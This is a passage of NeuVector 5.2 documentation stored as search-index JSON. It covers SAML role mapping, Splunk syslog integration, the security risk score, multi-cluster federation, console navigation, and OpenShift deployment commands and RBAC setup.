Provider Single Sign-On URLIdentity Provider IssuerX.509 CertificateSpecify group attribute name if non-default value is used.    After the user is authenticated, the proper role can be derived with group-based role mapping configuration. To setup group-based role mapping,  If group-based role mapping is not configured or the matched groups cannot be located, the authenticated user will be assigned with the Default role. If the Default role is set to None, when group-based role mapping fails, the user is not able to login.Specify a list of groups respectively in Admin and Reader role map. The user's group attribute is piggybacked in the response after the user is authenticated. If the matched group is located, the corresponding role will be assigned to the user.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"5.2","tagName":"h3"},{"title":"Splunk","type":0,"sectionRef":"#","url":"/5.2/integration/splunk","content":"","keywords":"","version":"5.2"},{"title":"Integrating with Splunk with the NeuVector Splunk App​","type":1,"pageTitle":"Splunk","url":"/5.2/integration/splunk#integrating-with-splunk-with-the-neuvector-splunk-app","content":" The NeuVector Splunk App can be found in the splunkbase catalog here or by searching for NeuVector.  The NeuVector Security dashboard helps to identify security events such as suspicious login attempts, network violations and vulnerable images.  Below are sample screens displayed in the Splunk app.  Image Vulnerabilities​    Admission Control and Security Events​    Network Violations by Pod/Service (Deployments)​    Egress Connection Summary​    NeuVector Login Activity Dashboard​    ","version":"5.2","tagName":"h3"},{"title":"Setup and Configuration​","type":1,"pageTitle":"Splunk","url":"/5.2/integration/splunk#setup-and-configuration","content":" Getting the app​  GitHub​  Download the latest app tarball (neuvector_app.tar.gz) from the neuvector/neuvector-splunk-app repository.  Splunkbase​  Download the latest app tarball from Splunkbase.  Splunk Apps Browser​  In the Splunk UI, click on the Apps dropdown, click &quot;Find More Apps&quot;, then search for NeuVector Splunk App.  Installation and Setup​  Install the app by either uploading the tarball or following the Splunkbase prompts.  Configure syslog in NeuVector console  Go to Settings -&gt; Configuration -&gt; Syslog  a. set the server value as the IP address that Splunk is running b. choose TCP as the protocol; c. set port number as 10514; d. choose Info Level; e. click SUBMIT to save the setting.    You can configure multiple clusters to send syslog to your splunk instance and your splunk instance will receive these syslogs in real time.  FAQs​  What user role is required?​  Any user role. ","version":"5.2","tagName":"h3"},{"title":"Navigating NeuVector","type":0,"sectionRef":"#","url":"/5.2/navigation","content":"Navigating NeuVector Console Menu and Navigation","keywords":"","version":"5.2"},{"title":"Improve Security Risk Score","type":0,"sectionRef":"#","url":"/5.2/navigation/improve_score","content":"","keywords":"","version":"5.2"},{"title":"Improving the Security Risk Score​","type":1,"pageTitle":"Improve Security Risk Score","url":"/5.2/navigation/improve_score#improving-the-security-risk-score","content":" The Security Risk Score in the Dashboard provides a score between 0 and 100.  0-20 Good21-50 Fair51-100 Poor  The score is the sum of following metrics, each shown as a maximum value, with a max 100:  NeuVector Protection Mode - 30Ingress/Egress Risk - 42Privileged Containers - 4Root Containers - 4Admission Controls - 4Vulnerabilities - 16 (Containers - 8, Host - 6, orchestrator Platform - 2)  By default, NeuVector includes all containers, including system containers, in the risk score. This can be customized for each learned container Group to disable certain containers from being included in the risk score calculation, as shown below.  How to Improve the Score​  NeuVector Protection Mode​  Change the New Service Protection Mode in Settings -&gt; Configuration to Monitor or ProtectChange all ‘learned’ Groups in Policy -&gt; Groups to Monitor or Protect  Or  Click the Tool icon to follow the Wizard to perform the above steps  Ingress/Egress Risk​  Click the Tool icon to follow the Wizard to review Ingress and EgressReview all Ingress and Egress Connections to make sure they should be allowedSwitch all services that are still in Discover mode to Monitor or ProtectReview and Clear all threats, violations and session history by clicking the Delete/Trash icon for each one  Privileged and/or Root Containers​  Remove privileged containersRemove Root Containers Note: This may not be possible due to your required containers, however each of these only account for 4 points.  Admission Controls​  Make sure that, in a Kubernetes/OpenShift environment, Admission Control is enabled and there is at least one active rule in Policy -&gt; Admission Control  Vulnerabilities​  Make sure all non-system containers are in Monitor or Protect mode, in Policy -&gt; GroupsRemove/remediate host vulnerabilitiesRemove/remediate orchestrator platform (e.g. Kubernetes, OpenShift) vulnerabilities  How to Customize Which Container Groups Are Included in the Score​  To enable or disable which container Groups are included in the Security Risk Score, go to the Policy -&gt; Groups menu, and select the Group to modify. The summary column on the right has a 'Scorable' icon which indicates which groups are used for scoring.    Select or deselect the Scorable check box in the upper right for the selected Group.  note Only 'learned Groups' (e.g. those that begin with 'nv.') can be edited, not reserved groups or custom groups. ","version":"5.2","tagName":"h3"},{"title":"Enterprise Multi-Cluster Management","type":0,"sectionRef":"#","url":"/5.2/navigation/multicluster","content":"","keywords":"","version":"5.2"},{"title":"Enterprise Console​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/5.2/navigation/multicluster#enterprise-console","content":" The NeuVector console can be used to manage large enterprise multi-cluster and multi-cloud deployments. One cluster should be selected as the Primary cluster, and other Remote clusters will then be able to join the Primary. Once connected, the Primary cluster can push Federated rules down to each remote cluster, which display as Federated rules in the consoles of each remote cluster. Scanned Federated registries will also sync the scan results with remote clusters. Only local users &amp; Rancher users who have admin permission can promote a cluster to become the primary cluster.  In addition to Federated policy, multi-cluster management supports monitoring of each remote cluster in a summary page, as shown below.    There MUST be network connectivity between the controllers in each cluster on the required ports. The controller is exposed external to its cluster by either a primary or remote service, as can be seen in the sample NeuVector deployment yaml file.  ","version":"5.2","tagName":"h3"},{"title":"Configuring the Primary and Remote Clusters​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/5.2/navigation/multicluster#configuring-the-primary-and-remote-clusters","content":" Log into the console for the cluster which will be the Primary cluster. In the upper right drop down menu, select Multiple Clusters and then Promote to configure the Primary. Note: Only local users &amp; Rancher users who have admin permission can promote a cluster to become the primary cluster. Currently, SSO/LDAP/OIDC users with admin role are not allowed to promote a cluster to primary.  Enter the public IP and port of the fed-master service. You can find this by running  kubectl get svc -n neuvector   The output will look like:  NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE neuvector-service-controller-fed-master LoadBalancer 10.27.249.147 35.238.131.23 11443:31878/TCP 17d neuvector-service-controller-fed-worker LoadBalancer 10.27.251.1 35.226.199.111 10443:32736/TCP 17d   In the above example the primary controller host name/IP is 35.238.131.23 and the port is 11443. Note: Make sure this IP address and port are externally accessible (from the remote clusters). Note: The system clocks (time) must be the same for each primary and remote cluster in order to function properly.  After logging back into the console, select Multiple Clusters again from the upper right menu, and click on the icon to generate a token needed to connect the remote clusters. Copy the token for use in the next step. The token is valid for about 1 hour, and if expired must be generated again to connect future remote clusters.    To join a remote cluster to the primary, login to the remote cluster console as an admin. Select Multiple Clusters from the upper right drop down, and click on Join. Enter the controller IP or host name for the remote cluster as well as the port. Again, you can retrieve this information from the remote cluster by doing:  kubectl get svc -n neuvector   Use the output for the fed-worker of the remote cluster to configure the IP address and port. Then enter the token copied from the primary. Note that after entering the token, the IP address and port for the primary will be automatically filled in, but this can be edited or manually entered.    Log out of the remote cluster and log back into the primary. Or if already logged in, click refresh and the remote cluster will be listed in the Multiple Clusters menu.    You can click on the manage icon in the list, or use the pull down multi-cluster menu at the top to switch clusters at any time. Once you have switched to a remote cluster, all menu items on the left now apply to the remote cluster.  ","version":"5.2","tagName":"h3"},{"title":"Federated Policy​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/5.2/navigation/multicluster#federated-policy","content":" Please see the Policy -&gt; Federated Policy section for instructions on how to create Federated rules that will be pushed to each cluster.  ","version":"5.2","tagName":"h3"},{"title":"Federated Registries for Distributed Image Scanning Results​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/5.2/navigation/multicluster#federated-registries-for-distributed-image-scanning-results","content":" The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.  Federated registries can only be configured by a federated admin on the primary cluster in Assets -&gt; Registries. After adding and scanning a federated repository, the scan results will be synchronized to all managed clusters. Admission control rules in each managed cluster which require image scanning (e.g. CVE, compliance based rules) will automatically use both federated scan results as well as any registry scans results locally configured.  Federating Results from CI/CD Scanners (Optional)​  Federated registry scan results are always sync'd to managed clusters, as described above. The primary cluster can also receive scan results from stand alone scanner scans or scanner plug-ins invoked from a build CI/CD pipeline. To enable build phase (CI/CD) repository scanning results to also sync to managed clusters, first enable it by editing the primary (master) cluster settings as shown below.   ","version":"5.2","tagName":"h3"},{"title":"Security Policy & Rules","type":0,"sectionRef":"#","url":"/5.2/policy","content":"Security Policy &amp; Rules Manage network, process, and file system rules. Discover, Monitor, Protect Modes enable learning of normal application behavior and detection of violations.","keywords":"","version":"5.2"},{"title":"Navigating the Console","type":0,"sectionRef":"#","url":"/5.2/navigation/navigation","content":"","keywords":"","version":"5.2"},{"title":"Console Access​","type":1,"pageTitle":"Navigating the Console","url":"/5.2/navigation/navigation#console-access","content":" The console requires HTTPS access on default port 8443. The default user and password are admin.  Please see the first section Basics -&gt; Connect to Manager for configuration options such as turning off https, accessing the console through a corporate firewall which does not allow port 8443, or replacing the self-signed certificate.  ","version":"5.2","tagName":"h3"},{"title":"Menus and Navigation​","type":1,"pageTitle":"Navigating the Console","url":"/5.2/navigation/navigation#menus-and-navigation","content":" Use the left side menu to navigate in your NeuVector console. Note that there are additional settings in upper right for User Profile and Multi-Cluster configuration.  Dashboard​  The Dashboard shows a summary of risk scores, security events, and application protocols detected by NeuVector. It also shows details for some of these security events. PDF reports can be generated from the Dashboard which contain detailed charts and explanations.  At the top of the dashboard there is a summary of the security risks in the cluster. The wrench tool next to the overall risk score can be clicked to open a wizard which will guide you through recommended steps to reduce/improve the risk score. Mousing over each risk gauge will provide a description of it to the right and how to improve the risk score. Also see the separate documentation section Improving Security Risk Score.    Overall Security Risk Score. This is a weighted summary of the individual risk areas summarized to the right, including Service exposure, Ingress/Egress exposure, and Vulnerability exploit risks. Click on the wrench to improve the score.Service Exposure Risk Score. This is an indicator of how many services are protected by whitelist rules and running in the Monitor or Protect mode, where risk is lowest. A high ratio of services in Discover mode means these services are not segmented or isolated by whitelist rules.Ingress/Egress Risk Score. This is a weighted summary of actual threats or network violations detected on ingress or egress (out of the cluster) connections, combined with allowed ingress/egress connections. External connections which are protected by whitelist rules have lower risk but can still be attacked by embedded network attacks. Note: A list of ingress and egress IPs can be downloaded from the Ingress/Egress details section as an Exposure Report.Vulnerability Exploit Risk Score. This is the risk of exploits of vulnerabilities in running containers. Services in Discover mode with High criticality vulnerabilities will have the highest impact on the score, as they are highest risk. If services are in Monitor or Protect but still have High vulnerabilities, they are protected by network and process rules to identify (and block) suspicious activity, so will have a lower weighting on the score. A warning will be shown if the Auto-Scan button is not enabled for automatic run-time scanning.  Some of the charts are interactive, as shown below with the green arrows.    Some of the event data shown in the dashboard have limits, as described in the Reporting section.  Application Protocols Detected This chart summarizes the application protocols detected in live connections in the cluster. The category ‘Other’ means any unrecognized HTTP protocols or raw TCP connections. You can toggle between the Application Coverage and the Application Volume levels.  Application Coverage is the number of unique pod to pod conversations detected between application services. For example if service pod A connects to service pod B using HTTP that is one unique HTTP ‘conversation’, but all connections between A and B count as one conversation.Application Volume is the network activity measured in Gbytes for all services using that protocol.  Network Activity​  This provides a graphical map of your containers and the conversations between containers. It also shows connections with other local and external resources. In Monitor and Protect modes, violations are displayed with red or yellow lines to indicate that a violation has been detected.  note If a large number of containers or services are present, the view will automatically default to a namespace view (collapsed). Double click on a namespace icon to expand it.  note This display uses a local GPU if available to speed loading times. Some Windows GPUs have known issues, and the use of the GPU can be turned off in Advanced Filter window (see below for Tools).  Some of the actions possible are:  Move objects around to better view services and conversationsClick on any line (arrow) to see more detail such as protocol/port, latest time stamp, and to add or edit a rule (NOTE: both connection endpoints must be fully expanded by double clicking on each in order to see the connection details)Click on any container to see details, and the ‘i’ for real-time connections. You can also quarantine a node from here. Right click on a container to perform actions.Filter view by protocol, or search by namespace, group, container (upper right). You can add multiple filters to the selection box.Refresh the map to show latest conversationsZoom in/out to switch between a logical view (all containers collapsed into a service group) or physical view (all containers for the same service displayed)Toggle on/off the display of orchestration components such as load balancers (e.g. built in for Kubernetes or Swarm)(Service Mesh Icon) Double click to expand a pod in a service mesh such as Istio/Linkerd2 to show the sidecar and workload containers within the pod.  The Tools menu in the upper left has these functions, from left to right:  Zoom in/outReset the icon displays (if you've moved them around)Open the Advanced Filter window (filters remain for the user login session)Display/Hide the LegendTake a screen shotRefresh the Network Activity Display    Right clicking on a container displays the following actions:    You can view active sessions, start packet capture recordings, and quarantine from here. You can also change the overall protection mode for the service (all containers for that service) here. The expand/collapse options enable you to simplify or expand the objects.  The data in the map may take a few seconds after network activity to be displayed.  See the explanation of the Legend icons at the bottom of this page.  Assets​  Assets displays information about Platforms, Nodes, Containers, Registries, Sigstore Verifiers (used in Admission Control rules), and System Components (NeuVector Controllers, Scanners, and Enforcers).  NeuVector includes an end-to-end vulnerability management platform which can be integrated into your automated CI/CD process. Scan registries, images, and running containers and host nodes for vulnerabilities. Results for individual registries, nodes, and containers can be found here, while combined results and advanced reporting can be found in the Security Risks menu.  NeuVector also automatically runs the Docker Bench security report and Kubernetes CIS Benchmark (if applicable) on each host and running containers.  Note that the Status of all containers is shown in Assets -&gt; Containers, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Please see the section Scanning &amp; Compliance for additional details, including how to use the Jenkins plug-in NeuVector Vulnerability Scanner.  Policy​  This displays and manages the run-time Security Policy which determines what container networking, process, and file system application behavior is ALLOWED and DENIED. Any conversations and activities which are not explicitly allowed are logged as violations by NeuVector. This is also where Admission Control rules can be created.  Please see the Security Policy section of these docs for a detailed explanation of the behavior of the rules and how to edit or create rules.  Security Risks​  This enables customizable Vulnerability and Compliance management investigation, triage, and reporting. Easily research image vulnerabilities and find out which nodes or containers contain those vulnerabilities. Advanced filtering makes reviewing scan and compliance check results and provides customized reporting.  These menu's combine results from registry (image), node, and container vulnerability scans and compliance checks to enable end-to-end vulnerability management and reporting.  Notifications​  This is where you can see the logs for Security Events, Risk Reports (e.g. Scanning) and general Events. NeuVector also supports SYSLOG for integration with tools such as SPLUNK as well as webhook notifications.  Security Events  Use the search or Advanced Filter to locate specific events. The timeline widget at the top can also be adjusted using the left and right circles to change the time window. You can also easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.  NeuVector continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:  Implicit Deny Rule is Violated  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Violations detailed are captured and source IPs can be investigated further.  Other security events include privilege escalations, suspicious processes, or abnormal file system activity detected on containers or hosts.  Risk Reports  Registry scanning, run-time scanning, admission control events will be shown here. Also, CIS benchmarks and compliance checks results will be shown.  Please see the Reporting section for additional details and limits of the event displays in the console.  Settings​  Settings -&gt; Users &amp; Roles​  Add other users here. Users can be assigned an Admin role, a Read-only role, or custom role. In Kubernetes, users can be assigned one or more namespaces to access. Custom roles can also be configured here for users and Groups (e.g. LDAP/AD) to be mapped to the roles. See the users section for configuration details.  Settings -&gt; Configuration​  Configure a unique cluster name, new services mode, and other settings here.  If deploying on a Rancher or OpenShift cluster, authentication can be enabled such that Rancher users or OpenShift users can log into the NeuVector console with the associated RBACs. For Rancher users, a connecting button/link from the Rancher console allows Rancher admin's to open and access the NeuVector console directly.  The New Service Mode sets which protection mode any new services (applications) previously unknown or undefined in NeuVector will by default be set to. For production environments, it is not recommended to set this to Discover.  The Network Service Policy Mode, if enabled, applies the selected policy mode globally to the network rules for all groups, and each Group’s individual policy mode will only apply to process and file rules.  The Automated Promotion of Group Modes promotes a Group’s protection Mode automatically (from Discover to Monitor to Protect) based on elapsed time and criteria.  The Auto-Deletion of Unused Groups is useful for automated 'clean-up' of the discovered (and auto-created rules for) groups which are no longer in use, especially high-churn development environments. See Policy -&gt; Groups for the list of groups in NeuVector. Removing unused Groups will clean up the Groups list and all associated rules for those groups.  The XFF-FORWARDED-FOR enables/disables use of these headers in enforcing NeuVector network rules. This is useful to retain the original source IP of an ingress connection so it can be used for network rules enforcement. Enable means the source IP will be retained. See below for a detailed explanation.  Multiple webhooks can be configured to be used in Response Rules for customized notifications. Webhook format choices include Slack, JSON, and key-value pairs.  A Registry Proxy can be configured if your registry scanning connection between the controller and the registry must go through a proxy.  Configure SIEM integration through SYSLOG, including types of events, port etc. You can also choose to send events to the controller pod logs instead of or in addition to syslog. Note that these events will only be sent to the lead controller pod's log (not all controller pod logs in a multi-controller deployment).  An integration with IBM Security Advisor and QRadar can be established.  Import/Export the Security Policy file. You can configure SSO for SAML and LDAP/AD here as well. See the Enterprise Integration section for configuration details. Important! Be careful when importing the configuration file. Importing will overwrite the existing settings. If you import a ‘policy only’ file, the Groups and Rules of the Policy will be overwritten. If you import a file with ‘all’ settings, then the Policy, Users, and Configurations will be overwritten. Note that the original ‘admin’ user’s password of your current Controller will also be overwritten with the original admin’s password in the imported file.  The Usage Report and Collect Log exports may be requested by your NeuVector support team.  XFF-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Settings -&gt; LDAP/AD, SAML, and OpenID Connect​  NeuVector supports integration with LDAP/AD, SAML, and OpenID Connect for SSO and user group mapping. See the Enterprise Integration section for configuration details.  Multiple Cluster Management​  You can manage multiple NeuVector clusters (e.g. multiple Kubernetes clusters running NeuVector on different clouds or on premise) by selecting a Master cluster, and joining remote clusters to them. Each remote cluster can also be individually managed. Security rules can be propagated to multiple clusters through use of Federated Policy settings.  My Profile​  You can increase the browser timeout setting, change your password and do other administrative profile edits.  Icon Descriptions in Legend &gt; Network Activity​  You can toggle the Legend on/off in the tools box of the Network Activity map.  Here is what the icons mean:  External network​  This is any network outside the NeuVector cluster. This could include internet public access or other internal networks.  Namespace​  Namespace in Kubernetes or Project in OpenShift  Group/Container/Service Mesh in discovery​  This container is in Discover mode, where connections to/from it are learned and whitelist rules will automatically be created.  Group/Container/Service Mesh being monitored​  This container is in Monitor mode, where violations will be logged but not blocked.  Group/Container/Service Mesh being protected​  This container is in Protect mode, where violations will be blocked.  Container Group​  This represent a group of containers in a service. Use this to provide a more abstract view if there are many container instances for a service/application (i.e. from the same image).  Un-managed node​  This node has been detected but does not have a NeuVector enforcer on it.  Un-managed container​  This container has been detected but is not on a node with a NeuVector enforcer on it. This could also represent some system services.  Exited Container​  This container is not running but in an 'exited' state.  IP group​  This is a group of IP Addresses.  Normal Conversation​  Allowed, whitelisted connections are displayed in blue.  Internal Conversation​  A connection within a service is shown in light gray.  Conversation with warning​  A connection which has generated a violation alert is shown in lighter red.  Conversation being blocked​  If a connection is a violation, as shown in red, and has been blocked by NeuVector, the arrow will have an ‘x’ in it.  Quarantined container​  Containers with a red circle around them have been quarantined. To un-quarantine, right-click on the container and select the un-quarantine button. ","version":"5.2","tagName":"h3"},{"title":"RedHat OpenShift","type":0,"sectionRef":"#","url":"/5.2/deploying/openshift","content":"","keywords":"","version":"5.2"},{"title":"Deploy Separate NeuVector Components with RedHat OpenShift​","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift#deploy-separate-neuvector-components-with-redhat-openshift","content":" NeuVector is compatible with standard ovs SDN plug-ins as well as others such as flannel, weave, or calico. The samples below assume a standard ovs plug-in is used. This also assumes a local docker registry will be used (see instructions at end for creating the secret for dynamically pulling from neuvector or Docker Hub).  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm. The NeuVector Operator can also be used to deploy and is based on the Helm chart. To deploy the latest NeuVector container versions using an Operator, please use either the Red Hat Certified Operator from Operator Hub or the community operator, as detailed in the Operator section.  To deploy manually, first pull the appropriate NeuVector containers from the NeuVector registry into your local registry. Note: the scanner image should be pulled regularly for CVE database updates from NeuVector.  NeuVector Images on Docker Hub​  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example: neuvector/manager:5.2.0  neuvector/controller:5.2.0  neuvector/enforcer:5.2.0  neuvector/scanner:latest  neuvector/updater:latest   Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml: Update the registry to docker.io  Update image names/tags to the current version on Docker hub, as shown above  Leave the imagePullSecrets empty   ","version":"5.2","tagName":"h3"},{"title":"Deploy on OpenShift​","type":1,"pageTitle":"RedHat OpenShift","url":"/5.2/deploying/openshift#deploy-on-openshift","content":" docker login docker.io docker pull docker.io/neuvector/manager:&lt;version&gt; docker pull docker.io/neuvector/controller:&lt;version&gt; docker pull docker.io/neuvector/enforcer:&lt;version&gt; docker pull docker.io/neuvector/scanner docker pull docker.io/neuvector/updater docker logout docker.io   The sample file below will deploy one manager, 3 controllers, and 2 scanner pods. It will deploy an enforcer on every node as a daemonset, including on the master node (if schedulable). See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues. If you plan to use a PersistentVolume claim to store the backup of NeuVector config files, please see the general Backup/Persistent Data section in the Production Deployment overview.  Next, set the route and allow privileged NeuVector containers using the instructions below. By default, OpenShift does not allow privileged containers. Also, by default OpenShift does not schedule pods on the Master node. See the instructions at the end to enable/disable this.  note Please see the Enterprise Integration section for details on integration with OpenShift Role Based Access Controls (RBACs).  Login as a normal user  oc login -u &lt;user_name&gt;   Create a new project.  note If the --node-selector argument is used when creating a project this will restrict pod placement such as for the NeuVector enforcer to specific nodes.  oc new-project neuvector   Push NeuVector images to OpenShift docker registry.  note For OpenShift 4.6+, change docker-registry.default.svc below to image-registry.openshift-image-registry.svc in the commands below  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag docker.io/neuvector/enforcer:&lt;version&gt; docker-registry.default.svc:5000/neuvector/enforcer:&lt;version&gt; docker tag docker.io/neuvector/controller:&lt;version&gt; docker-registry.default.svc:5000/neuvector/controller:&lt;version&gt; docker tag docker.io/neuvector/manager:&lt;version&gt; docker-registry.default.svc:5000/neuvector/manager:&lt;version&gt; docker tag docker.io/neuvector/scanner docker-registry.default.svc:5000/neuvector/scanner docker tag docker.io/neuvector/updater docker-registry.default.svc:5000/neuvector/updater docker push docker-registry.default.svc:5000/neuvector/enforcer:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/controller:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/manager:&lt;version&gt; docker push docker-registry.default.svc:5000/neuvector/scanner docker push docker-registry.default.svc:5000/neuvector/updater docker logout docker-registry.default.svc:5000   note Please see the section Updating the CVE Database below for recommendations for keeping the latest scanner image updated in your registry.  Login as system:admin account  oc login -u system:admin   Create Service Accounts and Grant Access to the Privileged SCC  oc create sa controller -n neuvector oc create sa enforcer -n neuvector oc create sa basic -n neuvector oc create sa updater -n neuvector oc -n neuvector adm policy add-scc-to-user privileged -z controller -z enforcer   The following info will be added in the Privileged SCC users:  - system:serviceaccount:neuvector:controller - system:serviceaccount:neuvector:enforcer   In OpenShift 4.6+ use the following to check:  oc get rolebinding system:openshift:scc:privileged -n neuvector -o wide   NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS system:openshift:scc:privileged ClusterRole/system:openshift:scc:privileged 9m22s neuvector/controller, neuvector/enforcer   Create the custom resources (CRD) for NeuVector security rules. For OpenShift 4.6+ (Kubernetes 1.19+):  oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/waf-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/dlp-crd-k8s-1.19.yaml oc apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/admission-crd-k8s-1.19.yaml   Add read permission to access the kubernetes API and OpenShift RBACs. IMPORTANT: The standard NeuVector 5.2+ deployment uses least-privileged service accounts instead of the default. See below if upgrading to 5.2+ from a version prior to 5.2.  oc create clusterrole neuvector-binding-app --verb=get,list,watch,update --resource=nodes,pods,services,namespaces oc create clusterrole neuvector-binding-rbac --verb=get,list,watch --resource=rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io,imagestreams.image.openshift.io oc adm policy add-cluster-role-to-user neuvector-binding-app system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-rbac system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-admission --verb=get,list,watch,create,update,delete --resource=validatingwebhookconfigurations,mutatingwebhookconfigurations oc adm policy add-cluster-role-to-user neuvector-binding-admission system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions oc adm policy add-cluster-role-to-user neuvector-binding-customresourcedefinition system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-nvsecurityrules --verb=list,delete --resource=nvsecurityrules,nvclustersecurityrules oc adm policy add-cluster-role-to-user neuvector-binding-nvsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user view system:serviceaccount:neuvector:controller --rolebinding-name=neuvector-binding-view oc create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules oc adm policy add-cluster-role-to-user neuvector-binding-nvwafsecurityrules system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules oc adm policy add-cluster-role-to-user neuvector-binding-nvadmissioncontrolsecurityrules system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules oc adm policy add-cluster-role-to-user neuvector-binding-nvdlpsecurityrules system:serviceaccount:neuvector:controller oc create role neuvector-binding-scanner --verb=get,patch,update,watch --resource=deployments -n neuvector oc adm policy add-role-to-user neuvector-binding-scanner system:serviceaccount:neuvector:updater system:serviceaccount:neuvector:controller -n neuvector --role-namespace neuvector oc create clusterrole neuvector-binding-csp-usages --verb=get,create,update,delete --resource=cspadapterusagerecords oc adm policy add-cluster-role-to-user neuvector-binding-csp-usages system:serviceaccount:neuvector:controller oc create clusterrole neuvector-binding-co --verb=get,list --resource=clusteroperators oc adm policy add-cluster-role-to-user neuvector-binding-co system:serviceaccount:neuvector:enforcer system:serviceaccount:neuvector:controller   note If upgrading from a previous NeuVector deployment (prior to 5.2), you will need to delete the old bindings, then create new ones: oc delete clusterrolebinding neuvector-binding-app neuvector-binding-rbac neuvector-binding-admission neuvector-binding-customresourcedefinition neuvector-binding-nvsecurityrules neuvector-binding-view neuvector-binding-nvwafsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-co oc delete rolebinding neuvector-admin -n neuvector oc adm policy add-cluster-role-to-user neuvector-binding-app system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-rbac system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-admission system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-customresourcedefinition system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-nvsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user view system:serviceaccount:neuvector:controller --rolebinding-name=neuvector-binding-view oc adm policy add-cluster-role-to-user neuvector-binding-nvwafsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-nvadmissioncontrolsecurityrules system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-nvdlpsecurityrules system:serviceaccount:neuvector:controller oc create role neuvector-binding-scanner --verb=get,patch,update,watch --resource=deployments -n neuvector oc adm policy add-role-to-user neuvector-binding-scanner system:serviceaccount:neuvector:updater system:serviceaccount:neuvector:controller -n neuvector --role-namespace neuvector oc create clusterrole neuvector-binding-csp-usages --verb=get,create,update,delete --resource=cspadapterusagerecords oc adm policy add-cluster-role-to-user neuvector-binding-csp-usages system:serviceaccount:neuvector:controller oc adm policy add-cluster-role-to-user neuvector-binding-co system:serviceaccount:neuvector:enforcer system:serviceaccount:neuvector:controller   Run the following command to check if the neuvector/controller, neuvector/enforcer and neuvector/updater service accounts are added successfully.  oc get ClusterRoleBinding neuvector-binding-app neuvector-binding-rbac neuvector-binding-admission 